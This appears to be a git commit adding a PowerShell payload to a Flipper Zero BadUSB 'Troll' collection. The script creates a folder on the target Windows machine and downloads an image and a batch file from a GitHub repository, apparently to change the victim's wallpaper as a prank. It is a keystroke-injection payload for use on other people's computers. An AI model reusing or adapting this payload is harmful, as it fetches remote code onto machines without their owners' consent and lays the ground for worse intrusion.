2f8e4a8ab2ac6b599908bdc69f1592ce20d97335
8ad3rror <zimny30c@gmail.com>
2024-12-12 23:41:30 +0100

    UP

---
+++ BadUSB/Troll/TrolloWallpaper/payload.ps1
@@ -0,0 +1,8 @@
+$folderPath = "C:\AutoWall"
+if (-Not (Test-Path -Path $folderPath)) {New-Item -Path $folderPath -ItemType Directory}
+$fileUrl = "https://raw.githubusercontent.com/8ad3rror/Flipper-Zero/refs/heads/main/BadUSB/Troll/TrolloWallpaper/trollo.jpg"
+$filePath = "$folderPath\trollo.jpg"
+$fileUrl2 = "https://github.com/8ad3rror/Flipper-Zero/raw/refs/heads/main/BadUSB/Troll/TrolloWallpaper/AutoWall.bat"
+$filePath2 = "$folderPath\AutoWall.bat"
+Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
+Invoke-WebRequest -Uri $fileUrl2 -OutFile $filePath2
